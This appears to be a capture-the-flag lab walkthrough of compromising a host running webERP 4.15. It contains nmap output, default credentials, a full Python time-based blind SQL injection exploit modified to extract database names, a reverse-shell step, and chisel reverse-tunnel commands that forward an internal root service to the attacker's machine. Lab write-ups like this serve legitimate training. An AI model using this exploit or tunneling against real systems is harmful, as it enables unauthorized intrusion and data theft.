#### Enumeration

Performing network service reconnaissance using Nmap.

```shell
└─$ sudo nmap --min-rate 1000 -p- -Pn 192.168.175.227 -sC -sV
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 10:21 CST
Nmap scan report for 192.168.175.227
Host is up (0.29s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62361a5cd3e37be170f8a3b31c4c2438 (RSA)
|   256 ee25fc236605c0c1ec47c6bb00c74f53 (ECDSA)
|_  256 835c51ac32e53a217cf6c2cd936858d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: TsukorERP
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

Trying to log in using common credentials and SQL injection, but unable to gain access.

Continuing our search of the web directory, we find a robots.txt file that provides an additional link to `/weberp/index.php`.

We are able to log in successfully using the credentials we found on Google.

```
admin///weberp
```

![4]

Please note that logging into this ERP system may be a bit slow.

![5]

Once we log in, we can verify that the system version is 4.15 and identify a related vulnerability.

![6]
![7]

We test the vulnerability and confirm that the PoC codes works properly. Please note that both the `path` and `order` parameters must be entered correctly. It took me a lot of time to test.

![8]

Although this PoC codes is only for blind SQL injection testing, we can modify it to retrieve the data, just like in sqlmap. I refer to other SQL injection testing codes and modify our PoC codes accordingly. The results are as follows:

```python
# Exploit Title: Blind SQL injection in WebERP.
# Date: June 10, 2019
# Exploit Author: Semen Alexandrovich Lyhin (https://www.linkedin.com/in/semenlyhin/)
# Vendor Homepage: http://www.weberp.org/
# Version: 4.15

# A malicious query can be sent in base64 encoding to unserialize() function. It can be deserialized as an array without any sanitization then. 
# After it, each element of the array is passed directly to the SQL query. 

import requests
import base64
import os
import subprocess
from bs4 import BeautifulSoup
import re
import time
import sys

def generatePayload(PaidAmount="0",PaymentId="0"):
    #THIS FUNCTION IS INSECURE BY DESIGN
    ToSerialize = r"[\"%s\" => \"%s\"]" % (PaymentId, PaidAmount)
    return os.popen("php -r \"echo base64_encode(serialize(" + ToSerialize + "));\"").read()

def getCookies(ip, CompanyNameField, usr, pwd):
    r = requests.get("http://" + ip + "/index.php")
    s = BeautifulSoup(r.text, 'lxml')
    m = re.search("FormID.*>", r.text)
    FormID = m.group(0).split("\"")[2]
    
    data = {"FormID":FormID,"CompanyNameField":CompanyNameField,"UserNameEntryField":usr,"Password":pwd,"SubmitUser":"Login"}
    r = requests.post("http://" + ip + "/index.php", data)
    
    return {"PHPSESSIDwebERPteam":r.headers["Set-Cookie"][20:46]}
    

def addSupplierID(name, cookies, proxies):
    r = requests.get("http://" + ip + "/Suppliers.php", cookies=cookies)
    s = BeautifulSoup(r.text, 'lxml')
    m = re.search("FormID.*>", r.text)
    FormID = m.group(0).split("\"")[2]
    
    data = {"FormID":FormID,"New":"Yes","SupplierID":name,"SuppName":name,"SupplierType":"1","SupplierSince":"01/06/2019","BankPartics":"","BankRef":"0",
            "PaymentTerms":"20","FactorID":"0","TaxRef":"","CurrCode":"USD","Remittance":"0","TaxGroup":"1","submit":"Insert+New+Supplier"}
            
    requests.post("http://" + ip + "/Suppliers.php", data=data,cookies=cookies,proxies=proxies)


def runExploit(cookies, supplier_id, payload, proxies):
    r = requests.get("http://" + ip + "/Payments.php", cookies=cookies)
    s = BeautifulSoup(r.text, 'lxml')
    m = re.search("FormID.*>", r.text)
    FormID = m.group(0).split("\"")[2]
    
    data = {"FormID":FormID,
            "CommitBatch":"2",
            "BankAccount":"1",
            "DatePaid":"01/06/2019",
            "PaidArray":payload}
         
    requests.post("http://" + ip + "/Payments.php?identifier=1559385755&SupplierID=" + supplier_id, data=data,cookies=cookies,proxies=proxies)


if __name__ == "__main__":
    #proxies = {'http':'127.0.0.1:8080'}
    proxies = {}
    
    if len(sys.argv) != 6:
        print '(+) usage: %s <target> <path> <login> <password> <order>' % sys.argv[0]
        print '(+) eg: %s 127.0.0.1 "weberp/webERP/" admin weberp 1' % sys.argv[0]
        print 'Order means the number of company on the website. Can be gathered from the login page and usually equals 0 or 1'
        exit()
    
    ip = sys.argv[1] + "/" + sys.argv[2]
    
    #if don't have php, set Payload to the next one to check this time-based SQLi: YToxOntpOjA7czoyMzoiMCB3aGVyZSBzbGVlcCgxKT0xOy0tIC0iO30=
    #payload = generatePayload("0 where 1=IF((SELECT count(*) FROM information_schema.schemata)='3', SLEEP(5), 0);-- -", "0")
    
    #payload = generatePayload("0", "' or sleep(5) and '1'='1")
    #payload = generatePayload("0", "' or 1=IF((SELECT count(*) FROM information_schema.schemata)='3', SLEEP(5), 0) and '1'='1")
    for i in range(1, 50):
            
        dictionary = " ,abcdefghijklmnopqrstuvwxyz0123456789_"

        for j in range(0, len(dictionary)):        
            # get databases    
            payload = generatePayload("0", "-12' or sleep(IF((SELECT substring(group_concat(schema_name),%s,1) FROM information_schema.schemata" \
                                      " WHERE schema_name NOT IN ('information_schema','mysql','performance_schema')) = '%s', 5, 0)) and '1'='1" % (i, dictionary[j]))
            
            #get cookies
            cookies = getCookies(ip, sys.argv[5], sys.argv[3], sys.argv[4])
            
            addSupplierID("GARUMPAGE", cookies, proxies)
            
            t1 = time.time()
            runExploit(cookies, "GARUMPAGE", payload, proxies)
            t2 = time.time()
            
            if (t2-t1>4) and j == 0:
                print "Finish"
                sys.exit()
            elif (t2-t1>4) and j == 1:
                print "\n"
            elif (t2-t1>4):
                print dictionary[j]
                break
            #else:
                #print "Verify input data and try again"
```

![9]

As you can see, we have found another database named `inoerp_db`. Although we could try to modify the code to continue retrieving tables and more information, but it would take a lot of time. So, let's try googling the database name and see what we can find.

Now that we know it is another ERP system, perhaps it has been installed on our target host and has vulnerabilities?

```
http://192.168.188.227/inoerp/
```

![10]

![11]

Although the vulnerability version is not applicable, we can still attempt to use it and see what happens.

![12]

We have obtained a reverse shell.

![13]

![14]

#### Privilege Escalation

We have found an active port 8443 that was not visible during the initial nmap scan.

![15]

Use `chisel` to forward the service.

Use port 80 on our host to listen to the forwarding.

```shell
./chisel server -p 80 --reverse -v
```

![16]

Execute the following command on the target host.

```shell
# ./chisel client <attacker ip>:<attacker port> R:<attacker service port>:localhost:<target service port>
./chisel client 192.168.45.5:80 R:5678:localhost:8443
```

![17]

The service has been successfully forwarded.

![18]

Confirmed that an HTTP service is running on port 8443 on the target host via nmap scan.

![19]

![20]

This service has an unauthenticated RCE vulnerability and is running with root privilege.

![21]

Since port 80 is already being used for listening and forwarding, we will choose another active port from the list for reverse shell listening.

![]

